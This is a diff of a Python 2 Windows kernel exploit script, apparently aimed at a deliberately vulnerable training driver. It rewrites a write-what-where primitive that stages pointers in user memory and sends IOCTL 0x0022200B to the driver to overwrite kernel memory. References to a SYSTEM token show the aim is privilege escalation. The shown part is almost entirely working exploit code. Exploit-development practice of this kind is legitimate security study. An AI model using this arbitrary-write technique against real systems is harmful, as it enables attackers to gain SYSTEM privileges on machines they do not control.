@@ -177,58 +177,37 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
 ################################################### WRITE ###########################################################
 
-def writePrimitive(driver, what_addr, where, system_token):
+def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
+	
+    what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
+    # Write the what value to what_addr
+    data = struct.pack("<Q", what)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory","e")
+        sys.exit()
 
+    # Pack the address of the what value and the where address
+    data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory in the packing section","e")
+        sys.exit()
+    
     IoControlCode = 0x0022200B
-    InputBuffer = c_void_p(1)
-    InputBufferLength = 0x10
-    OutputBuffer = c_void_p(0)
-    OutputBufferLength = 0
+    InputBuffer = c_void_p(0x000000001a000000)
+    InputBufferLength = 0x10 
+    OutputBuffer = c_void_p(0x0)
+    OutputBufferLength = 0x0
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-
-    what = cast(system_token, POINTER(c_ulonglong))[0]
-    everythingworked = cast(user_addr, POINTER(c_ulonglong))[0]
-          
-    print "Looks like everything worked, SYSTEM TOKEN value is: " + str(everythingworked)
-    # Write the what value to int(what_addr)
-
-    #data = struct.pack('<Q', what)
-    #dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-        #user_addr, data, len(data), byref(written))
-
-    #if dwStatus == 0:
-        #print ('Something went wrong while writing to memory', 'e')
-        #sys.exit()
-
-    data = struct.pack('<Q', long(what_addr)) + struct.pack('<Q', long(where))
-    print data
-    #dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            #1, data, len(data), byref(written))
-
-    #if dwStatus == 0:
-        #print ('Something went wrong while writing to memory in the packing section'
-               #, 'e')
-        #sys.exit()
-
-    print 'Value before DeviceIoControl: %08x' % cast(1, POINTER(c_ulonglong))[0]
-
-    triggerIOCTL = kernel32.DeviceIoControl(
-        driver,
-        IoControlCode,
-        InputBuffer,
-        InputBufferLength,
-        OutputBuffer,
-        OutputBufferLength,
-        lpBytesReturned,
-        NULL,
-        )
-
-    print 'Value after: %08x' % cast(1,
-            POINTER(c_ulonglong))[0]
+    print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
+    print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    
     return triggerIOCTL
-
 
 ################################################### READ ###########################################################
                           # What is it you want to read? #We are writing it back to userland memory.
